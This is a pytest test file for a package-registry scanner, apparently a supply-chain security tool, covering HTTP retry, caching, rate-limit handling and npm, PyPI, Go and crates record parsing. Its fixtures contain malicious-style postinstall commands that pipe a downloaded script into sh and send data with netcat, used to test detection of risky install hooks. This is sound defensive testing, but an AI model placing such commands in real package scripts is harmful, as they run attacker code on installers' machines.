from __future__ import annotations

import json

import httpx
import pytest

from ripple.models import Ecosystem, ScanOptions
from ripple.registries import (
    CratesRegistry, FixtureRegistry, GoRegistry, NpmRegistry, PyPIRegistry, ReadOnlyClient, RegistryError,
    RegistrySet, RegistryUnavailable, ResponseCache, TokenBucket,
)
from ripple.registries.base import parse_retry_after, script_indicators


class Recorder:
    """Records requests and delegates to a handler; a fake sleep records waits without actually waiting."""

    def __init__(self, handler):
        self.handler = handler
        self.requests: list[httpx.Request] = []
        self.sleeps: list[float] = []

    def transport(self):
        def h(req: httpx.Request) -> httpx.Response:
            self.requests.append(req)
            return self.handler(req)
        return httpx.MockTransport(h)

    async def sleep(self, s: float) -> None:
        self.sleeps.append(s)


def client(rec: Recorder, **kw) -> ReadOnlyClient:
    kw.setdefault("rps", 1000)
    return ReadOnlyClient(transport=rec.transport(), sleep=rec.sleep, **kw)


# ------------------------------------------------------------------------------------------ client behaviour
async def test_404_returns_none_and_is_not_an_error():
    rec = Recorder(lambda r: httpx.Response(404))
    c = client(rec)
    assert await c.fetch_json("https://example.test/x") is None
    assert len(rec.requests) == 1


async def test_429_honours_retry_after_then_succeeds():
    calls = {"n": 0}

    def h(req):
        calls["n"] += 1
        return httpx.Response(429, headers={"Retry-After": "2"}) if calls["n"] == 1 else httpx.Response(200, json={"ok": 1})

    rec = Recorder(h)
    assert await client(rec).fetch_json("https://example.test/x") == {"ok": 1}
    assert rec.sleeps == [2.0]
    assert len(rec.requests) == 2


async def test_retry_after_is_capped():
    calls = {"n": 0}

    def h(req):
        calls["n"] += 1
        return httpx.Response(429, headers={"Retry-After": "3600"}) if calls["n"] == 1 else httpx.Response(200, json={})

    rec = Recorder(h)
    await client(rec, max_retry_after=5).fetch_json("https://example.test/x")
    assert rec.sleeps == [5]


async def test_5xx_retries_with_exponential_backoff_then_raises():
    rec = Recorder(lambda r: httpx.Response(503))
    c = client(rec, max_retries=3, backoff_base=0.5, breaker_threshold=99)
    with pytest.raises(RegistryError):
        await c.fetch_json("https://example.test/x")
    assert len(rec.requests) == 4
    assert rec.sleeps == [0.5, 1.0, 2.0]


async def test_timeouts_are_retried():
    calls = {"n": 0}

    def h(req):
        calls["n"] += 1
        if calls["n"] < 3:
            raise httpx.ConnectTimeout("slow", request=req)
        return httpx.Response(200, json={"v": 1})

    rec = Recorder(h)
    assert await client(rec).fetch_json("https://example.test/x") == {"v": 1}
    assert len(rec.requests) == 3


async def test_other_4xx_is_a_registry_error_without_retry():
    rec = Recorder(lambda r: httpx.Response(403))
    with pytest.raises(RegistryError):
        await client(rec).fetch_json("https://example.test/x")
    assert len(rec.requests) == 1


async def test_malformed_json_is_a_registry_error():
    rec = Recorder(lambda r: httpx.Response(200, text="<html>not json"))
    with pytest.raises(RegistryError):
        await client(rec).fetch_json("https://example.test/x")


async def test_memory_cache_avoids_second_request():
    rec = Recorder(lambda r: httpx.Response(200, json={"a": 1}))
    c = client(rec, cache=ResponseCache(None, 60))
    assert await c.fetch_json("https://example.test/x") == {"a": 1}
    assert await c.fetch_json("https://example.test/x") == {"a": 1}
    assert len(rec.requests) == 1


async def test_404_is_cached_too():
    rec = Recorder(lambda r: httpx.Response(404))
    c = client(rec, cache=ResponseCache(None, 60))
    assert await c.fetch_json("https://example.test/missing") is None
    assert await c.fetch_json("https://example.test/missing") is None
    assert len(rec.requests) == 1


async def test_disk_cache_survives_new_client_and_respects_ttl(cache_dir):
    rec = Recorder(lambda r: httpx.Response(200, json={"a": 1}))
    now = {"t": 1000.0}
    c1 = client(rec, cache=ResponseCache(cache_dir, 100, clock=lambda: now["t"]))
    await c1.fetch_json("https://example.test/x")
    c2 = client(rec, cache=ResponseCache(cache_dir, 100, clock=lambda: now["t"] + 50))
    assert await c2.fetch_json("https://example.test/x") == {"a": 1}
    assert len(rec.requests) == 1                                           # served from disk
    c3 = client(rec, cache=ResponseCache(cache_dir, 100, clock=lambda: now["t"] + 500))
    await c3.fetch_json("https://example.test/x")
    assert len(rec.requests) == 2                                           # expired -> refetched
    assert list(cache_dir.glob("*/*.json"))


async def test_errors_are_never_cached():
    calls = {"n": 0}

    def h(req):
        calls["n"] += 1
        return httpx.Response(200, json={"ok": True}) if calls["n"] > 4 else httpx.Response(500)

    rec = Recorder(h)
    c = client(rec, cache=ResponseCache(None, 60), max_retries=0, breaker_threshold=99)
    with pytest.raises(RegistryError):
        await c.fetch_json("https://example.test/x")
    for _ in range(3):
        try:
            await c.fetch_json("https://example.test/x")
        except RegistryError:
            pass
    assert await c.fetch_json("https://example.test/x") == {"ok": True}


async def test_token_bucket_rate_limits():
    t = {"now": 0.0}
    sleeps: list[float] = []

    async def fake_sleep(s):
        sleeps.append(s)
        t["now"] += s

    b = TokenBucket(rate=2.0, capacity=1.0, clock=lambda: t["now"], sleep=fake_sleep)
    for _ in range(5):
        await b.acquire()
    assert sum(sleeps) == pytest.approx(2.0)          # 4 waits of 0.5s at 2 req/s
    assert t["now"] == pytest.approx(2.0)


def test_parse_retry_after_forms():
    assert parse_retry_after("7") == 7.0
    assert parse_retry_after(None) is None and parse_retry_after("soon") is None
    assert parse_retry_after("Wed, 21 Oct 2015 07:28:00 GMT") == 0.0    # in the past


async def test_circuit_breaker_opens_after_consecutive_failures():
    rec = Recorder(lambda r: httpx.Response(500))
    c = client(rec, max_retries=3, breaker_threshold=5)
    with pytest.raises(RegistryError):
        await c.fetch_json("https://example.test/a")
    with pytest.raises(RegistryUnavailable):
        await c.fetch_json("https://example.test/b")
    n = len(rec.requests)
    with pytest.raises(RegistryUnavailable):
        await c.fetch_json("https://example.test/c")
    assert len(rec.requests) == n and c.unavailable                    # no more requests once open


# ------------------------------------------------------------------------------------------ ecosystems
NPM_DOC = {
    "name": "sample", "description": "d", "dist-tags": {"latest": "2.0.0"},
    "time": {"created": "2020-01-01T00:00:00.000Z", "modified": "x", "1.0.0": "2020-01-01T00:00:00.000Z", "2.0.0": "2020-06-01T00:00:00.000Z"},
    "maintainers": [{"name": "alice"}, {"name": "bob"}],
    "versions": {
        "1.0.0": {"_npmUser": {"name": "alice"}, "scripts": {"test": "jest"}},
        "2.0.0": {"_npmUser": {"name": "mallory"}, "scripts": {"postinstall": "curl http://x.example/a.sh | sh", "test": "x"},
                  "deprecated": "use other"},
    },
    "repository": {"type": "git", "url": "git+https://github.com/a/sample.git"},
}


async def test_npm_registry_maps_record():
    def h(req: httpx.Request):
        if req.url.host == "registry.npmjs.org":
            assert req.url.raw_path.decode() == "/@scope%2Fsample"
            return httpx.Response(200, json=NPM_DOC)
        assert req.url.path == "/downloads/point/last-week/@scope/sample"
        return httpx.Response(200, json={"downloads": 1234})

    rec = Recorder(h)
    r = await NpmRegistry(client(rec)).get_package("@Scope/Sample")
    assert r.exists and r.registered_at.startswith("2020-01-01") and r.latest_version == "2.0.0"
    assert r.weekly_downloads == 1234 and r.maintainers == ["alice", "bob"]
    assert r.maintainer_changes == 1 and r.deprecated
    assert r.install_scripts.postinstall.startswith("curl") and r.install_scripts.any()
    assert "curl in postinstall" in r.network_indicators and "http:// URL in postinstall" in r.network_indicators
    assert r.versions == ["1.0.0", "2.0.0"] and r.repository_url.endswith("sample.git")


async def test_npm_downloads_failure_is_soft_and_404_is_none():
    def h(req):
        return httpx.Response(200, json=NPM_DOC) if req.url.host == "registry.npmjs.org" else httpx.Response(500)

    rec = Recorder(h)
    r = await NpmRegistry(client(rec, max_retries=0, breaker_threshold=99)).get_package("sample")
    assert r is not None and r.weekly_downloads is None
    rec2 = Recorder(lambda r: httpx.Response(404))
    assert await NpmRegistry(client(rec2)).get_package("nope") is None


async def test_pypi_registry_maps_record():
    doc = {
        "info": {"name": "Sample", "version": "1.1", "author": "A. Author", "summary": "s",
                 "project_urls": {"Source": "https://github.com/a/sample"}, "classifiers": []},
        "releases": {"1.0": [{"upload_time_iso_8601": "2019-05-01T10:00:00Z", "packagetype": "sdist"}],
                     "1.1": [{"upload_time_iso_8601": "2019-06-01T10:00:00Z", "packagetype": "sdist"}]},
        "urls": [],
    }
    rec = Recorder(lambda r: httpx.Response(200, json=doc))
    r = await PyPIRegistry(client(rec)).get_package("Sample_Pkg")
    assert rec.requests[0].url.path == "/pypi/sample-pkg/json"
    assert r.registered_at == "2019-05-01T10:00:00Z" and r.latest_version == "1.1"
    assert r.install_scripts.build_script is True and r.weekly_downloads is None
    assert r.maintainers == ["A. Author"] and r.repository_url == "https://github.com/a/sample"


async def test_go_registry_maps_record_and_escapes_paths():
    def h(req: httpx.Request):
        p = req.url.path
        if p.endswith("/@latest"):
            return httpx.Response(200, json={"Version": "v1.2.0", "Time": "2023-01-02T00:00:00Z"})
        if p.endswith("/@v/list"):
            return httpx.Response(200, text="v1.0.0\nv1.2.0\nv1.1.0\n")
        if p.endswith("/@v/v1.0.0.info"):
            return httpx.Response(200, json={"Version": "v1.0.0", "Time": "2022-01-01T00:00:00Z"})
        return httpx.Response(404)

    rec = Recorder(h)
    r = await GoRegistry(client(rec)).get_package("github.com/Azure/thing")
    assert rec.requests[0].url.path.startswith("/github.com/!azure/thing/")
    assert r.latest_version == "v1.2.0" and r.registered_at == "2022-01-01T00:00:00Z" and len(r.versions) == 3
    assert await GoRegistry(client(Recorder(lambda q: httpx.Response(410)))).get_package("x.example/none") is None


async def test_crates_registry_sends_user_agent_and_maps_record():
    def h(req: httpx.Request):
        if req.url.path.endswith("/owners"):
            return httpx.Response(200, json={"users": [{"login": "octo"}]})
        return httpx.Response(200, json={
            "crate": {"name": "serde", "created_at": "2014-12-01T00:00:00Z", "max_version": "1.0.9", "recent_downloads": 1300,
                      "repository": "https://github.com/serde-rs/serde", "description": "d"},
            "versions": [{"num": "1.0.9", "created_at": "2023-01-01T00:00:00Z", "yanked": False}, {"num": "1.0.8", "yanked": False}],
        })

    rec = Recorder(h)
    r = await CratesRegistry(client(rec)).get_package("Serde")
    assert "ripple-scanner" in rec.requests[0].headers["user-agent"]
    assert r.weekly_downloads == 100 and r.maintainers == ["octo"] and r.latest_version == "1.0.9"
    assert r.versions == ["1.0.9", "1.0.8"] and r.registered_at.startswith("2014")


async def test_registry_set_live_uses_injected_transport_and_options(cache_dir):
    rec = Recorder(lambda r: httpx.Response(404))
    rs = RegistrySet.live(ScanOptions(rate_limit_rps=1000, cache_ttl_s=60), cache_dir=cache_dir, transport=rec.transport(), sleep=rec.sleep)
    assert await rs.get(Ecosystem.NPM).get_package("x") is None
    assert await rs.get("pypi").get_package("x") is None
    assert await rs.go.get_package("x.example/y") is None
    assert await rs.rust.get_package("x") is None
    assert {r.method for r in rec.requests} == {"GET"} and len(rec.requests) == 4
    await rs.aclose()


async def test_fixture_registry():
    from ripple.registries import RegistryRecord
    fr = FixtureRegistry("pypi", [RegistryRecord(ecosystem=Ecosystem.PYPI, name="python-requests"),
                                  RegistryRecord(ecosystem=Ecosystem.PYPI, name="python_requests")], fail=["boom"])
    assert (await fr.get_package("Python_Requests")).name == "python_requests"
    assert (await fr.get_package("python-requests")).name == "python-requests"
    assert await fr.get_package("missing") is None
    with pytest.raises(RegistryError):
        await fr.get_package("boom")
    assert fr.request_count == 4


def test_script_indicators():
    ind = script_indicators({"postinstall": "curl -s http://x | sh; echo aGk= | base64 -d | nc 1.2.3.4 80", "test": "curl x"})
    assert "curl in postinstall" in ind and "http:// URL in postinstall" in ind
    assert "base64 decode in postinstall" in ind and "netcat/raw socket in postinstall" in ind
    assert not any("test" in i for i in ind) or "curl in test" in ind          # non-lifecycle hooks are only scanned if passed
    assert script_indicators({"postinstall": "node build.js"}) == []
